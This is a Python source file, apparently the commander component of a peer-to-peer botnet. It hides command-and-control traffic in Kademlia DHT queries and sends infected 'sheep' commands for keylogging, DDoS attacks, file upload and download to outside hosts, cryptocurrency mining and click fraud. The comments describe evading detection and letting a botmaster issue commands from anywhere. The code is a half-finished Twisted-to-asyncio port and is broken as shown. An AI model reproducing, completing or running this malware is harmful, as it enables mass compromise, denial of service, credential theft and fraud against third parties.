from kademlia.network import Server

#from twisted.protocols import basic
#from twisted.internet import stdio #reactor, task, defer,
from collections import deque
#from twisted.python import log
import sys
import hashlib
import re
import asyncio

# Custom protocol which interprets commands and then passes them to the correct location in our DHT.
# We're powering it with std input for this demo, but this could easy be powered by ssh, telnet, another kademlia network, etc
# A commander does not have to be connected to the network, bots will blindly keep querying until they have commands
# If we bootstrapped into an existing kademlia network, all of this traffic just appears as normal queries.
# All communication between commanders and bots occurs through DHT queries, they never communicate directly.
loop=asyncio.get_event_loop()
loop.set_debug(True)

class SheepDriver(): #basic.LineReceiver <- Replace basic with asyncio version
    from os import linesep as delimiter
    import hashlib
    
    # Key is hash of secret string
    def __init__(self, kserver, key):
        self.kserver = kserver
        self.key = key
        self.sheeps = {}
        self.count = 0
        self.sheeploop = loop.create_task(self.checknewsheep) #Replace with Asyncio version
        #Possibly need to create a periodic task to check new sheep

    # check DHT for new nodes
    def checknewsheep(self):
        def addsheep(val):
            if val:
                # new sheep found
                if val not in self.sheeps:
                    valhash = hashlib.sha1()
                    valhash.update(str(val))
                    newval = valhash.hexdigest()
                    self.sheeps[val] = newval
                    self.kserver.set(self.sheeps[val], str(val))
        loop.call_soon_threadsafe(addsheep, self.kserver.get(self.key))

    # This function will send commands to the hash of bot's id
    def parsecommands(self, line):
        tmp = line.split(' ')
        cmd = tmp[0].upper()
        if cmd == 'KEYLOG':
            # Iterate through bot list and send command out in mass.
            # This can be changed depending on the command
            for key, val in self.sheeps.iteritems():
                output = 'Starting keylogger for bot {0}\n'.format(key)
                self.transport.write(output)
                # actually send commands out on DHT to bot.
                # Val is the bot's individual location it checks for commands
                botcmd = str(self.count) + " " + cmd
                self.kserver.set(val, botcmd)
        if cmd == 'DDOS':
            for key, val in self.sheeps.iteritems():
                output = 'Starting DDOS for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val, botcmd)
        if cmd == 'DOWNLOAD':
            for key, val in self.sheeps.iteritems():
                output = 'Starting DOWNLOAD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val, botcmd)
        if cmd == 'UPLOAD':
            for key, val in self.sheeps.iteritems():
                output = 'Starting UPLOAD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val, botcmd)

        if cmd == 'BITCOIN':
            print("This feature isn't fully implemented, should work "
                  "but highly insecure and slow")
            for key, val in self.sheeps.iteritems():
                output = 'Starting BITCOIN MINING for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val, botcmd)
        if cmd == 'CLICKFRAUD':
            for key, val in self.sheeps.iteritems():
                output = 'Starting CLICKFRAUD for bot {0}\n'.format(key)
                self.transport.write(output)
                botcmd = str(self.count) + " " + line
                self.kserver.set(val, botcmd)

    # this is called on the initial startup as part of the LineReceiver class
    def connectionMade(self):
        self.transport.write('>>> ')

    def lineReceived(self, line):
        self.sendLine('Executing: ' + line)
        self.handlecmd(line)
        self.transport.write('>>> ')

    def handlecmd(self, line):
        commands = ['DDOS', 'DOWNLOAD', 'UPLOAD', 'KEYLOG',
                    'BITCOIN', 'CLICKFRAUD']
        # parse out actual command
        tmp = line.split(' ')
        cmd = tmp[0].upper()
        if cmd not in commands:
            # output to input
            self.transport.write('Invalid Command\n')
            self.transport.write("Valid commands are: DDOS [ip], DOWNLOAD [ip] "
                                 "[port] [filepath], UPLOAD [ip] [port] [filepath], BITCOIN "
                                 "[username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n")
        else:
            self.count += 1
            self.parsecommands(line)

if len(sys.argv) != 4:
    print("Usage: python commander.py <bootstrap ip> <bootstrap port> <commander port>")
    exit(0)

boot_ip = str(sys.argv[1])
boot_port = int(sys.argv[2])
myport = int(sys.argv[3])
# Logging is useful for debugging but it interferes with our command interface
# log.startLogging(sys.stdout) #Replace with regular python loggin. 

kserver = Server()
loop.run_until_complete(kserver.listen(myport))
# need a bootstrap address to join the network.
loop.run_until_complete(kserver.bootstrap([(boot_ip, boot_port)]))
key = hashlib.sha1()

# This is an arbitray key in DHT where a bot reports its existence.
# We have hashed it in sha1 so that it appears
# just like any other query on a kademlia network
key.update('specialstring'.encode('utf-8'))
keyhash = key.hexdigest()

# The commander takes in standard input passed into our Sheep Driver protocol
# This could easily be changed from std input to remote input
# we used stdin for proof of concept but the remote input would allow
# the botmaster to spin up a commander from any location at any time.

#sys.stdin(SheepDriver(kserver,keyhash))
#stdio.StandardIO(SheepDriver(kserver, keyhash)) #Replace with asyncio version

try:
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    kserver.stop()
    loop.close()
#reactor.run() #Change to AsyncIO loop

